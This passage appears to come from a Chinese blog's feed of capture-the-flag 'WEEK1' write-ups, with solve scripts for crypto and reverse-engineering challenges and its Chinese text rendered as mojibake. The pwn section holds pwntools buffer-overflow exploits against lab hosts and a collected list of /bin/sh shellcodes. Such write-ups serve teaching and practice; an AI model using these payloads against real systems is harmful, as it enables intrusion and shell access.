class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="built_in">chr</span>(s[i]^<span class="number">143</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">Â <span class="comment">#flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;Â </span></span><br></pre></td></tr></table></figure><h5 id="WEEK1-CRYPTO-Vigenere-1"><a href="#WEEK1-CRYPTO-Vigenere-1" class="headerlink" title="WEEK1|CRYPTO VigenÃ¨re"></a>WEEK1|CRYPTO VigenÃ¨re</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from flag import flag, key</span></span><br><span class="line"><span class="comment"># modulus = 256</span></span><br><span class="line"><span class="comment"># ciphertext = []</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for f in flag:</span></span><br><span class="line"><span class="comment"># Â  Â  ciphertext.append((key[0]*f + key[1]) % modulus)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(bytes(ciphertext).hex())</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">modulus = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span></span><br><span class="line"></span><br><span class="line">s = binascii.unhexlify(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>) + j) % modulus ==s[<span class="number">0</span>] Â <span class="keyword">and</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>) + j) % modulus ==s[<span class="number">1</span>] Â <span class="keyword">and</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + j) % modulus == s[<span class="number">2</span>] :</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="built_in">print</span>(i,j)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">a,b = <span class="number">17</span>,<span class="number">23</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (a*k + b)%<span class="number">256</span> == s[i]:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  flag += <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®æºç çŸ¥é“ï¼Œa*flag+b =cå­—ç¬¦ï¼Œé‚£ä¹ˆï¼Œè®¾ä¸ªæ–¹ç¨‹å³å¯ï¼Œè§£å‡ºæ¥åï¼Œå†å¸¦å›å»ï¼Œå³å¯ã€‚</p><h5 id="WEEK1-PWN-ret2text"><a href="#WEEK1-PWN-ret2text" class="headerlink" title="WEEK1|PWN  ret2text"></a>WEEK1|PWN  ret2text</h5><p>ïŒ› ï„• /pwn/xinshengsai â¯ checksec ret2text                    âœ˜ INT ï‰’ 1m 16s root@Bohemian ï€— 11:08:48<br>[<em>] Checking for new versions of pwntools<br>    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.8/update to â€˜everâ€™ (old way).<br>    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[</em>] A newer version of pwntools is available on pypi (4.8.0 â€“&gt; 4.11.0).<br>    Update with: $ pip install -U pwntools<br>[*] â€˜/pwn/xinshengsai/ret2textâ€™<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>æ²¡æœ‰å¼€ä¿æŠ¤<br><img src="/images/xinshengsai/20231102112114.png" alt="image-20220126203415648"><br>æ‹–åˆ°idaæœ‰binbash,<br><img src="/images/xinshengsai/20231102112146.png" alt="image-20220126203415648"><br>æº¢å‡ºçš„è¯æ˜¯20+8<br>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p= remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29481</span>)</span><br><span class="line">backdoor = <span class="number">0x401212</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Welcome!May I have your name?\n&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(&#x27;cat flag&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvline(keepends=True)</span></span><br><span class="line"><span class="comment">#p.recvline(keepends=True)</span></span><br><span class="line"><span class="comment">#s = p.recv(numb = 2048, timeout = 3)</span></span><br><span class="line"><span class="comment">#sp = p.recv(numb = 5048, timeout = 3)</span></span><br><span class="line"><span class="comment">#print(sp)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="WEEK1-PWN-Vigenere"><a href="#WEEK1-PWN-Vigenere" class="headerlink" title="WEEK1|PWN VigenÃ¨re"></a>WEEK1|PWN VigenÃ¨re</h5><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">p= remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26857</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Welcome!May I have your name?\n&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(&#x27;cat flag&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvline(keepends=True)</span></span><br><span class="line"><span class="comment">#p.recvline(keepends=True)</span></span><br><span class="line"><span class="comment">#s = p.recv(numb = 2048, timeout = 3)</span></span><br><span class="line"><span class="comment">#sp = p.recv(numb = 5048, timeout = 3)</span></span><br><span class="line"><span class="comment">#print(sp)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ç›¸å…³shellcode,https://blog.csdn.net/Xzzzz911/article/details/<span class="number">133468714</span></span><br><span class="line"><span class="comment"># 32ä½ çŸ­å­—èŠ‚shellcode --&gt; 21å­—èŠ‚</span></span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 32ä½ çº¯asciiå­—ç¬¦shellcode</span></span><br><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 32ä½ scanfå¯è¯»å–çš„shellcode</span></span><br><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/<span class="built_in">bin</span>/sh</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64ä½ scanfå¯è¯»å–çš„shellcode 22å­—èŠ‚</span></span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64ä½ è¾ƒçŸ­çš„shellcode  23å­—èŠ‚</span></span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64ä½ çº¯asciiå­—ç¬¦shellcode</span></span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure><h5 id="WEEK1-PWN-p1eee"><a href="#WEEK1-PWN-p1eee" class="headerlink" title="WEEK1|PWN  p1eee"></a>WEEK1|PWN  p1eee</h5><p>20+8<br><img src="/images/xinshengsai/20231102161451.png" alt="image-20220126203415648"><br>bashåœ°å€126c<br><img src="/images/xinshengsai/20231102161516.png" alt="image-20220126203415648"><br>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn6&quot;)</span></span><br><span class="line">p= remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26148</span>)</span><br><span class="line">backdoor = <span class="number">0x126C</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-easy-RE"><a href="#WEEK1-REVERSE-easy-RE" class="headerlink" title="WEEK1|REVERSE  easy_RE"></a>WEEK1|REVERSE  easy_RE</h5><p>shift+f12çœ‹ä¸€ä¸‹å­—ç¬¦ä¸²ï¼Œæœä¸€ä¸‹flagï¼Œæœ‰ä¸€ä¸ª<br><img src="/images/xinshengsai/20231102191446.png" alt="image-20220126203415648"><br><img src="/images/xinshengsai/20231102191626.png" alt="image-20220126203415648"></p><h5 id="WEEK1-REVERSE-å’³"><a href="#WEEK1-REVERSE-å’³" class="headerlink" title="WEEK1|REVERSE  å’³"></a>WEEK1|REVERSE  å’³</h5><p>ä½¿ç”¨peæŸ¥ä¸€ä¸‹<br><code>https://github.com/ExeinfoASL/ASL/tree/master</code></p><p><img src="/images/xinshengsai/20231103101148.png" alt="image-20220126203415648"><br>upxçš„å£³ï¼Œ<br><code>upx -d file</code>å³å¯ï¼Œç„¶åæ‹–åˆ°idaä¸­ï¼Œçœ‹åˆ°å…³é”®å‡½æ•°ï¼Œå¯¹str1-1æ“ä½œç­‰äºencï¼ŒåŒå‡»encï¼Œå¾—åˆ°å­—ç¬¦ä¸²<br><img src="/images/xinshengsai/20231103111246.png" alt="image-20220126203415648"><br><img src="/images/xinshengsai/20231103111338.png" alt="image-20220126203415648"><br><code>gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~</code>,<br>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-Segments"><a href="#WEEK1-REVERSE-Segments" class="headerlink" title="WEEK1|REVERSE   Segments"></a>WEEK1|REVERSE   Segments</h5><p>Â Action Â  Â name: ShowSegments  </p><p>This command opens the segments window. The format of this window is explained here.</p><p>You can use list viewer commands in this window.</p><p>In order to change the selector values, use selectors window.Â </p><p>ä¸­æ–‡ç¿»è¯‘å¦‚ä¸‹ï¼š</p><p>æ“ä½œåç§°ï¼šShowSegments</p><p>æ­¤å‘½ä»¤æ‰“å¼€æ®µçª—å£ã€‚è¯¥çª—å£çš„æ ¼å¼åœ¨æ­¤å¤„è§£é‡Šã€‚</p><p>æ‚¨å¯ä»¥åœ¨æ­¤çª—å£ä¸­ä½¿ç”¨åˆ—è¡¨æŸ¥çœ‹å™¨å‘½ä»¤ã€‚</p><p>è¦æ›´æ”¹é€‰æ‹©å™¨å€¼ï¼Œè¯·ä½¿ç”¨é€‰æ‹©å™¨çª—å£ã€‚<br>æç¤ºäº†ï¼Œshift+f7å³å¯ï¼Œçœ‹åˆ°<br><img src="/images/xinshengsai/20231103111817.png" alt="image-20220126203415648"></p><h5 id="WEEK1-REVERSE-ELF"><a href="#WEEK1-REVERSE-ELF" class="headerlink" title="WEEK1|REVERSE   ELF"></a>WEEK1|REVERSE   ELF</h5><p><img src="/images/xinshengsai/20231107154347.png" alt="image-20220126203415648"><br>  for ( i = 0; i &lt; strlen(a1); ++i )<br>  {<br>    v2 = v6++;<br>    v4[v2] = (a1[i] ^ 0x20) + 16;<br>  }<br>  ç»™æ¯ä¸€ä¸ªå­—ç¬¦äº¦æˆ–0x20  ç„¶ååŠ ä¸Š16<br>  <img src="/images/xinshengsai/20231107154541.png" alt="image-20220126203415648"><br>  ç„¶åbase64ï¼Œ<br>  é‚£ä¹ˆé€†å‘çš„è¯å°±ï¼Œå…ˆè§£base64 ï¼Œç„¶åå‡  åœ¨äº¦æˆ–<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;</span></span><br><span class="line"></span><br><span class="line">s = base64.b64decode(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="built_in">chr</span>((i-<span class="number">16</span>)^<span class="number">0x20</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;D0_4ou_7now_wha7_ELF_1s?&#125;</span></span><br></pre></td></tr></table></figure></p><h5 id="WEEK1-REVERSE-Endian"><a href="#WEEK1-REVERSE-Endian" class="headerlink" title="WEEK1|REVERSE   Endian"></a>WEEK1|REVERSE   Endian</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">  v5 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v5 != (<span class="built_in">array</span>[i] ^ <span class="number">0x12345678</span>) )<span class="comment">//æ•°ç»„å’Œè¿™ä¸ª12345678äº¦æˆ–</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are right&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">åŒå‡»<span class="built_in">array</span>ï¼Œæœ‰ä¸€ä¸ªæ•°ç»„</span><br><span class="line">.rodata:<span class="number">0000000000002010</span> <span class="built_in">array</span>           dd <span class="number">75553</span>A1Eh, <span class="number">7B</span>583A03h, <span class="number">4</span>D58220Ch, <span class="number">7B</span>50383Dh, <span class="number">736B</span>3819h</span><br></pre></td></tr></table></figure><p><img src="/images/xinshengsai/20231107161623.png" alt="image-20220126203415648"><br>å†™ä¸ªè„šæœ¬ï¼Œå‡ºç†ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sums = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;75553A1E, 7B583A03, 4D58220C, 7B50383D, 736B3819&quot;</span></span><br><span class="line"></span><br><span class="line">a = a.split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line">Â  Â  suma = <span class="built_in">int</span>(i, <span class="number">16</span>)^<span class="number">0x12345678</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="built_in">str</span>(long_to_bytes(suma)[::-<span class="number">1</span>]),end=<span class="string">&quot;&quot;</span>,)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#b&#x27;flag&#x27;b&#x27;&#123;lli&#x27;b&#x27;ttl_&#x27;b&#x27;Endi&#x27;b&#x27;an_a&#x27;</span></span><br><span class="line">Â </span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-AndroXor"><a href="#WEEK1-REVERSE-AndroXor" class="headerlink" title="WEEK1|REVERSE   AndroXor"></a>WEEK1|REVERSE   AndroXor</h5><p><img src="/images/xinshengsai/20231107163630.png" alt="image-20220126203415648"><br>æ‹–åˆ°Androidkillä¸­ï¼Œçœ‹åˆ°ä»£ç <br>ä¹Ÿå°±æ˜¯æ¯ä¸ªå­—ç¬¦ä¸happyx3è¿›è¡Œäº¦æˆ–ï¼Œä¸å¤Ÿçš„å¾ªç¯å³å¯ï¼Œ<br>pocï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;happyx3&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;14, 13, 17, 23, 2, 75, 73, 55, 32, 30, 20, 73, 10, 2, 12, 62, 40, 64, 11, 39, 75, 89, 25, 65, 13 &quot;</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">s = s.split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i])^<span class="built_in">ord</span>((key[i%<span class="number">7</span>]))), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-EzPE"><a href="#WEEK1-REVERSE-EzPE" class="headerlink" title="WEEK1|REVERSE    EzPE"></a>WEEK1|REVERSE    EzPE</h5><p>æ–‡ä»¶æ‰“ä¸å¼€ï¼Œçœ‹ä¸€ä¸‹æ–‡ä»¶åå…­è¿›åˆ¶å¤´ï¼Œexeçš„æ–‡ä»¶å¤´ä¸º4D5A90,æ”¹ä¸€ä¸‹<br><img src="/images/xinshengsai/20231107164029.png" alt="image-20220126203415648"><br><code>https://thunderjie.github.io/2019/03/27/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/</code><br>å†å°†90 æ”¹æˆ80</p><p><code>shiift + e</code> idaé€‰ä¸­æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lis = [<span class="number">0x0A</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x1F</span>, <span class="number">0x26</span>, <span class="number">0x6C</span>, <span class="number">0x43</span>, <span class="number">0x2D</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>,</span><br><span class="line"></span><br><span class="line">Â  <span class="number">0x54</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>,</span><br><span class="line"></span><br><span class="line">Â  <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x36</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x26</span>, <span class="number">0x04</span>,</span><br><span class="line"></span><br><span class="line">Â  <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x37</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="comment">#print((index ^ lis[index+1])^ lis[index] )</span></span><br><span class="line"></span><br><span class="line">Â  Â  lis[index] = index ^ lis[index+<span class="number">1</span>] ^ lis[index] Â <span class="comment">#lis[34] = 34 ^ lis[35] ^ lis[34]çš„å€¼</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(lis)</span><br></pre></td></tr></table></figure><h5 id="WEEK1-REVERSE-lazy-activtiy"><a href="#WEEK1-REVERSE-lazy-activtiy" class="headerlink" title="WEEK1|REVERSE   lazy_activtiy"></a>WEEK1|REVERSE   lazy_activtiy</h5><p>æ‹–åˆ°andkillé‡Œç›´æ¥æœflag</p><p><img src="/images/xinshengsai/20231108102413.png" alt="image-20220126203415648"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pythonè‡ªåŠ¨ç‚¹å‡»å°è„šæœ¬</title>
      <link href="/2023/09/28/others/python%E8%87%AA%E5%8A%A8%E7%82%B9%E5%87%BB%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
      <url>/2023/09/28/others/python%E8%87%AA%E5%8A%A8%E7%82%B9%E5%87%BB%E5%B0%8F%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Â os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Â time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">&quot;Press Ctrl-C to end&quot;</span>)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  screenWidth, screenHeight = pag.size() Â <span 